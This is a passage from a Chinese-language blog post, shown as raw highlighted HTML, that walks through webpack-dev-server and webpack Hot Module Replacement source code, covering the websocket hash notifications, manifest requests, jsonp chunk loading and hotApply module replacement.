  <span class="token keyword">this</span><span class="token punctuation">.</span>app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">// 绑定监听事件</span>  <span class="token function">setupHooks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//当监听到一次webpack编译结束，就会调用_sendStats方法通过websocket给浏览器发送通知，</span>    <span class="token comment" spellcheck="true">//ok和hash事件，这样浏览器就可以拿到最新的hash值了，做检查更新逻辑</span>    <span class="token keyword">const</span> addHooks <span class="token operator">=</span> <span class="token punctuation">(</span>compiler<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token punctuation">{</span> compile<span class="token punctuation">,</span> invalid<span class="token punctuation">,</span> done <span class="token punctuation">}</span> <span class="token operator">=</span> compiler<span class="token punctuation">.</span>hooks<span class="token punctuation">;</span>      compile<span class="token punctuation">.</span><span class="token function">tap</span><span class="token punctuation">(</span><span class="token string">'webpack-dev-server'</span><span class="token punctuation">,</span> invalidPlugin<span class="token punctuation">)</span><span class="token punctuation">;</span>      invalid<span class="token punctuation">.</span><span class="token function">tap</span><span class="token punctuation">(</span><span class="token string">'webpack-dev-server'</span><span class="token punctuation">,</span> invalidPlugin<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 监听webpack的done钩子，tapable提供的监听方法</span>      done<span class="token punctuation">.</span><span class="token function">tap</span><span class="token punctuation">(</span><span class="token string">'webpack-dev-server'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>stats<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_sendStats</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sockets<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStats</span><span class="token punctuation">(</span>stats<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_stats <span class="token operator">=</span> stats<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token operator">...</span><span class="token operator">...</span>  <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//使用webpack-dev-middleware中间件，返回生成的bundle文件</span>  <span class="token function">setupDevMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// middleware for serving webpack bundle</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>middleware <span class="token operator">=</span> <span class="token function">webpackDevMiddleware</span><span class="token punctuation">(</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>compiler<span class="token punctuation">,</span>      Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token punctuation">{</span> logLevel<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>log<span class="token punctuation">.</span>options<span class="token punctuation">.</span>level <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token operator">...</span>  <span class="token comment" spellcheck="true">//创建http服务，并启动服务</span>  <span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//创建socket服务器建立长连接</span>  <span class="token function">createSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//使用socket在服务器和浏览器直接建立一个websocket长连接</span>  <span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 通过websoket给客户端发消息</span>  <span class="token function">_sendStats</span><span class="token punctuation">(</span>sockets<span class="token punctuation">,</span> stats<span class="token punctuation">,</span> force<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">sockWrite</span><span class="token punctuation">(</span>sockets<span class="token punctuation">,</span> <span class="token string">'hash'</span><span class="token punctuation">,</span> stats<span class="token punctuation">.</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stats<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">sockWrite</span><span class="token punctuation">(</span>sockets<span class="token punctuation">,</span> <span class="token string">'errors'</span><span class="token punctuation">,</span> stats<span class="token punctuation">.</span>errors<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>stats<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">sockWrite</span><span class="token punctuation">(</span>sockets<span class="token punctuation">,</span> <span class="token string">'warnings'</span><span class="token punctuation">,</span> stats<span class="token punctuation">.</span>warnings<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">sockWrite</span><span class="token punctuation">(</span>sockets<span class="token punctuation">,</span> <span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>client/index.js源码解析</strong></p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> onSocketMessage <span class="token operator">=</span> <span class="token punctuation">{</span>   hash<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token function">hash</span><span class="token punctuation">(</span>_hash<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 更新currentHash值</span>        status<span class="token punctuation">.</span>currentHash <span class="token operator">=</span> _hash<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    ok<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token function">ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 进行更新检查等操作</span>        <span class="token function">reloadApp</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 连接服务地址socketUrl，?http://localhost:8080，本地服务地址</span><span class="token function">socket</span><span class="token punctuation">(</span>socketUrl<span class="token punctuation">,</span> onSocketMessage<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="热更新"><a href="#热更新" class="headerlink" title="热更新"></a>热更新</h3><h4 id="热更新流程"><a href="#热更新流程" class="headerlink" title="热更新流程"></a>热更新流程</h4><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/webpackhmr/3id9sie_200629210005.png" alt="webpackHMR流程">  </p><ol><li>文件系统发生变化</li><li>当监听到文件发生变化时，webpack 使用HotModuleReplacementPlugin编译文件，并将代码保存在内存中(webpack-dev-middleware)。</li><li>同时，webpack-dev-server通过编译器compiler获得文件的编译情况。</li><li>在compiler的 <code>done</code> 钩子函数（生命周期）里调用_sendStats发送向client发送hash值，在client保存下来。</li><li>client接收到ok或warning消息后调用<strong>reloadApp</strong>发布客户端检查更新事件webpackHotUpdate。</li><li>webpack/hot监听到webpackHotUpdate事件，调用check方法进行hash值对比以及检查各modules是否需要更新。</li><li>调用JsonpMainTemplate.runtime的hotDownloadManifest方法向server端发送ajax请求</li><li>服务端返回hot-update.json（manifest）文件，该文件包含所有要更新模块的hash值和chunk名。</li><li>JsonpRuntime根据返回的json值使用jsonp请求具体的代码块</li><li>jsonp返回最新的chunk代码，并直接执行。</li><li>HotModulePlugin 将会对新旧模块进行对比，决定是否更新模块，检查模块之间的依赖关系，更新模块的同时更新模块间的依赖引用。</li><li>HMR runtime本身并不会处理代码修改，它会将不同文件交给对应的loader runtime处理</li><li>更新代码</li><li>如果更新失败，则直接刷新</li></ol><h4 id="webpaserver端源码"><a href="#webpaserver端源码" class="headerlink" title="webpaserver端源码"></a>webpaserver端源码</h4><p>在项目初始化时，服务端与客户端已经开启了长连接服务，当webpack对文件编译产生变化时，服务端会及时通知客户端。</p><pre><code>class Server {  ...  setupHooks() {    //添加webpack的done事件回调    const addHooks = (compiler) =&amp;gt; {      const { compile, invalid, done } = compiler.hooks;      //通知正在客户端编译        compile.tap(\&#39;webpack-dev-server\&#39;, invalidPlugin);      done.tap(\&#39;webpack-dev-server\&#39;, (stats) =&amp;gt; {        //编译完成向客户端发送消息        this._sendStats(this.sockets, this.getStats(stats));         this._stats = stats;      });    };    addHooks(this.compiler);  }   _sendStats(sockets, stats, force) {    if (...) { //无变化则return      return this.sockWrite(sockets, \&#39;still-ok\&#39;);    }    //如果有变化，则发送hash值    this.sockWrite(sockets, \&#39;hash\&#39;, stats.hash);    if (stats.errors.length &amp;gt; 0) {      this.sockWrite(sockets, \&#39;errors\&#39;, stats.errors);    } else {//没有报错发送ok      this.sockWrite(sockets, \&#39;ok\&#39;);    }  }  ...  //使用sockjs在浏览器端和服务端之间建立一个 websocket 长连接  listen(port, hostname, fn) {...}}</code></pre><p>这里仍然是Server.js中的代码，我详细的写展示了setupHooks中的代码，setupHooks 调用 webpack api 监听 compile的 done 事件，当编译完成，执行done钩子，调用_sendStats，在_sendStats方法中如果文件变化则发送hash。最后发送ok，客户端在接受到OK后会执行reload。</p><h4 id="client端源码"><a href="#client端源码" class="headerlink" title="client端源码"></a>client端源码</h4><p>客户端socket接受到hash后保存起来，随后接受到ok执行reload命令。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//Client/index.js</span><span class="token keyword">var</span> onSocketMessage <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token operator">...</span>  hash<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token function">hash</span><span class="token punctuation">(</span>_hash<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//将hash保存到全局currentHash中</span>    status<span class="token punctuation">.</span>currentHash <span class="token operator">=</span> _hash<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>  ok<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token function">ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>      <span class="token comment" spellcheck="true">//执行更新的reloadApp函数</span>    <span class="token function">reloadApp</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">socket</span><span class="token punctuation">(</span>socketUrl<span class="token punctuation">,</span> onSocketMessage<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Client/utils/reloadApp.js</span><span class="token keyword">function</span> <span class="token function">reloadApp</span><span class="token punctuation">(</span>_ref<span class="token punctuation">,</span> _ref2<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>hot<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//hotEmitter是events类，webpack-dev-server发布webpackHotUpdate给webapck</span>    <span class="token keyword">var</span> hotEmitter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>\'webpack<span class="token operator">/</span>hot<span class="token operator">/</span>emitter\'<span class="token punctuation">)</span><span class="token punctuation">;</span>    hotEmitter<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span>\'webpackHotUpdate\'<span class="token punctuation">,</span> currentHash<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> self <span class="token operator">!==</span> \'undefined\' <span class="token operator">&amp;&amp;</span> self<span class="token punctuation">.</span>window<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// broadcast update to window</span>      self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"webpackHotUpdate"</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>currentHash<span class="token punctuation">)</span><span class="token punctuation">,</span> \'<span class="token operator">*</span>\'<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端接收到ok指令后，执行reloadApp函数。reloadApp函数中，hotEmitter其实是events模块的实例，即在全局实现发布订阅模式，hotEmitter发布了webpackHotUpdate事件，同时webpack订阅这个指令。</p><p>在这里以后，浏览器端进入webpack的代码，webpack-dev-server在客户端的部分完成。</p><p>订阅webpackHotUpdate事件的代码在webpack/hot/dev-server.js中:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>module<span class="token punctuation">.</span>hot<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> lastHash<span class="token punctuation">;</span>    <span class="token keyword">var</span> check <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        module<span class="token punctuation">.</span>hot            <span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>updatedModules<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//检查所有要更新的模块，如果没有模块要更新那么回调函数就是null</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>updatedModules<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">upToDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果还有更新</span>                    <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> hotEmitter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./emitter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hotEmitter<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"webpackHotUpdate"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>currentHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>        lastHash <span class="token operator">=</span> currentHash<span class="token punctuation">;</span>        <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用check方法</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>module为全局对象，module.hot的代码在HMR runtime中，module.hot.check对应hotCheck方法：</p><pre class="line-numbers language-js"><code class="language-js">hotCheck <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//module.hot.check方法</span>    <span class="token keyword">return</span> hotDownloadManifest<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>update<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//保存全局的热更新信息</span>        hotAvailableFilesMap <span class="token operator">=</span> update<span class="token punctuation">.</span>c<span class="token punctuation">;</span>        hotUpdateNewHash <span class="token operator">=</span> update<span class="token punctuation">.</span>h<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*globals chunkId */</span>        <span class="token function">hotEnsureUpdateChunk</span><span class="token punctuation">(</span>chunkId<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">hotDownloadManifest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//ajax请求模块manifest</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">hotEnsureUpdateChunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//检测模块</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hotAvailableFilesMap<span class="token punctuation">[</span>chunkId<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span> <span class="token keyword">else</span>     <span class="token punctuation">{</span>        hotRequestedFilesMap<span class="token punctuation">[</span>chunkId<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token function">hotDownloadUpdateChunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">hotDownloadUpdateChunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//jsonp格式请求代码模块chunk</span><span class="token comment" spellcheck="true">//chunk是js代码块，格式是webpackHotUpdate("main", {...})，收到后直接执行，window全局中有对应方法</span>window<span class="token punctuation">[</span><span class="token string">"webpackHotUpdate"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">function</span> <span class="token function">webpackHotUpdateCallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">hotAddUpdateChunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">hotAddUpdateChunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//动态的更新代码模块</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> moduleId <span class="token keyword">in</span> moreModules<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//记录全局的热更新模块</span>        hotUpdate<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span> <span class="token operator">=</span> moreModules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">hotUpdateDownloaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">hotUpdateDownloaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//执行hotApply模块</span>    <span class="token function">hotApply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">hotApply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//将代码更新到modules中</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要包含了两个请求，在hotDownloadManifest中客户端请求了ajax的manifest，他的格式为 <code>{&quot;h&quot;:&quot;bbff25e45ca71af784d0&quot;,&quot;c&quot;:{&quot;main&quot;:true}}</code> 包含了要更新模块的hash值和chunk名；另一个hotDownloadUpdateChunk通过jsonp方法请求更新的代码块，<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/webpackhmr/down_200629164144.png" alt="hotDownloadUpdateChunk获取更新的代码"><br>获取到的代码块可以直接执行，webpack已经在window中注册了webpackHotUpdate方法，执行后调用hotApply热模块替换方法。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">hotApply</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">getAffectedStuff</span><span class="token punctuation">(</span>updateModuleId<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">...</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//返回过期的模块和依赖</span>            type<span class="token punctuation">:</span> <span class="token string">"accepted"</span><span class="token punctuation">,</span>            moduleId<span class="token punctuation">:</span> updateModuleId<span class="token punctuation">,</span>            outdatedModules<span class="token punctuation">:</span> outdatedModules<span class="token punctuation">,</span>            outdatedDependencies<span class="token punctuation">:</span> outdatedDependencies        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span>                result <span class="token operator">=</span> <span class="token function">getAffectedStuff</span><span class="token punctuation">(</span>moduleId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">...</span>        <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"self-declined"</span><span class="token punctuation">:</span>                    <span class="token operator">...</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"accepted"</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>对结果进行标记及处理                    <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>onAccepted<span class="token punctuation">)</span> options<span class="token punctuation">.</span><span class="token function">onAccepted</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>                    doApply <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                     <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"disposed"</span><span class="token punctuation">:</span>                    <span class="token operator">...</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token operator">...</span>            <span class="token punctuation">}</span>    <span class="token operator">...</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        moduleId <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">...</span>        <span class="token keyword">delete</span> installedModules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除过期的模块和依赖</span>        <span class="token keyword">delete</span> outdatedDependencies<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>moduleId <span class="token keyword">in</span> appliedUpdate<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>hasOwnProperty<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>appliedUpdate<span class="token punctuation">,</span> moduleId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//新的模块添加到modules中</span>            modules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span> <span class="token operator">=</span> appliedUpdate<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模块热替换主要分三个部分，首先是找出 outdatedModules 和 outdatedDependencies；然后从缓存中删除这些；最后，将新的模块添加到 modules 中，当下次调用 <strong>webpack_require</strong> (webpack 重写的 require 方法)方法的时候，就是获取到了新的模块代码了。</p><p>如果在热更新过程中出现错误，热更新将回退到刷新浏览器。</p><p>当用新的模块代码替换老的模块后，但是我们的业务代码并不能知道代码已经发生变化，也就是说，当入口文件修改后，我们需要在入口文件中调用 HMR 的 accept 方法</p><pre><code>// index.jsif(module.hot) {    module.hot.accept(\&#39;./main.js\&#39;, function() {        render()    })}</code></pre><p>更新的代码每次在下面这个循环中执行， <code>cb(moduleOutdatedDependencies)</code><br>就是<code>module.hot.accept</code>的内容，从而实现对代码的渲染</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">hotApply</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>moduleId <span class="token keyword">in</span> outdatedDependencies<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">...</span>        moduleOutdatedDependencies <span class="token operator">=</span> outdatedDependencies<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> callbacks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> moduleOutdatedDependencies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dependency <span class="token operator">=</span> moduleOutdatedDependencies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            cb <span class="token operator">=</span> module<span class="token punctuation">.</span>hot<span class="token punctuation">.</span>_acceptedDependencies<span class="token punctuation">[</span>dependency<span class="token punctuation">]</span><span class="token punctuation">;</span>            callbacks<span class="token punctuation">.</span><span class="token function">push</span><span class="token 